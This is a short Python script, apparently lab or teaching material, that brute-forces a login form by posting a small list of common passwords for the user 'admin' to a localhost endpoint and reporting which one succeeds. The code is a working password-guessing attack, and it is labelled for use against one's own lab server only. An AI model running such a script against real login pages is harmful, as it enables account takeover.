
# Run against YOUR OWN local lab server only
import requests

def brute_force_sim(url, username, wordlist):
    for pwd in wordlist:
        r = requests.post(url,
            data={"username": username, "password": pwd})

        if "successful" in r.text:
            print(f"[+] FOUND: {username}:{pwd}")
            return pwd
        else:
            print(f"[-] Failed: {pwd}")

    print("[-] Password not found in wordlist")
    return None

wordlist = ["123456", "password", "admin", "letmein", "qwerty", "sqrock123"]

brute_force_sim("http://localhost:5000/login", "admin", wordlist)